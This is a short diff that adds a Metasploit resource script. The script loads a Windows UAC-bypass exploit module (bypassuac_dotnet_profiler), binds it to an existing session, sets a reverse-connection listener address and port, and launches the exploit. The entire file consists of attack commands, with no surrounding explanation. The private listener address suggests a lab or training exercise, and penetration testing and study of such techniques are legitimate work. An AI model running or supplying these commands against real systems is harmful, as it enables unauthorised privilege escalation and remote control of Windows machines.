@@ -1,0 +1,5 @@
+use exploit/windows/local/bypassuac_dotnet_profiler
+set session 1
+set LHOST 10.10.11.20
+set LPORT 4455
+exploit
